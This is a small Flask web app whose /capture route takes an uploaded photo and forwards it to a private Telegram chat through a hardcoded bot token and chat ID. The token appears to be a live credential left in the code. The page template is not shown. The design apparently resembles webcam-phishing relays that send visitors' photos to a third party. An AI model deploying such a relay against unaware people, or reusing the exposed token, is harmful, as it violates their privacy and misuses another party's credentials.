from flask import Flask, render_template, request
import requests
from io import BytesIO

app = Flask(__name__)

# Replace with your actual bot token and chat ID
BOT_TOKEN = "8354022777:AAF3qM-nVuU0zvWHn71WgFP4TqYCfDo2NPA"
CHAT_ID = "1669489463"

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/capture", methods=["POST"])
def capture():
    photo = request.files.get("photo")
    if photo:
        photo_bytes = BytesIO()
        photo.save(photo_bytes)
        photo_bytes.seek(0)

        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        files = {'photo': ("image.jpg", photo_bytes)}
        data = {'chat_id': CHAT_ID}

        response = requests.post(url, data=data, files=files)
        if response.ok:
            return "Photo sent to Telegram", 200
        else:
            return f"Failed to send photo: {response.text}", 500

    return "No photo received", 400

if __name__ == "__main__":
    app.run(debug=True)